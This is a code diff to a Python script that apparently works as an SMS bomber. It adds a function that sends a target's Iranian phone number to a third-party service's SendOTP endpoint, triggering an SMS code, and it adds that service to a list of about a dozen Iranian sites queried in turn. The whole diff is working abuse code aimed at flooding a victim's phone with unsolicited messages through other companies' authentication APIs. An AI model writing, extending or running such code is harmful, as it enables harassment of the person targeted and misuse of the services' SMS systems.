@@ -241,6 +241,18 @@ def basalam(phone):
         return False
 
 
+def azno(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post(f"https://api-main.azno.space/api/Auth/SendOTP?phoneNumber={phone}&method=sms", headers={"Accept": "application/json"}, timeout=10)
+        data = r.json() if isinstance(r.json(), dict) else {}
+        success = r.status_code == 200 and data.get("success") is True
+        print(f"[{'+' if success else '-'}] Azno: {'Success' if success else r.status_code}")
+        return success
+    except: return False
+
+
 
 
 
@@ -248,7 +260,7 @@ def basalam(phone):
 # لیست سرویس‌ها
 # ==========================
 services = [
-    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam
+    digikala, bimehland, bimeparsian, ebimename, didar24 ,ibime ,bimeh, darunet, padmira, bornosmode ,chapmatin, vakiljo, basalam, azno
 ]
 
 # ==========================
